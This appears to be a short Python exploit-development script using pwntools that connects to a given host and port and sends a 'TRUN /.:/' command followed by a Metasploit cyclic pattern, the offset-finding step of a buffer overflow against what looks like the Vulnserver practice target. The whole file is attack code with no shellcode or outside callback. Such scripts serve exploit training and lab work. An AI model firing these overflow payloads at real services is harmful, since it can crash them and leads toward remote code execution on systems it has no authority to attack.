import pwn
import socket


# clutch pwn command listed here:
# pattern = pwn.cyclic_metasploit()

def buff(host, port, buffersize):
    try:
        buffer = b"".join([
            b"TRUN",
            b" ",
            b"/.:/",
            pwn.cyclic_metasploit(buffersize)
        ])

        sock = socket.socket(
            socket.AF_INET,
            socket.SOCK_STREAM
        )
        sock.settimeout(1)

        sock.connect((host, port))

        sock.send(buffer)
        print(
            "Transmitting {} bytes: {}".format(buffersize, buffer)
        )

        sock.recv(1024)
        sock.close()

    except socket.error:
        print("Couldn't connect to socket")
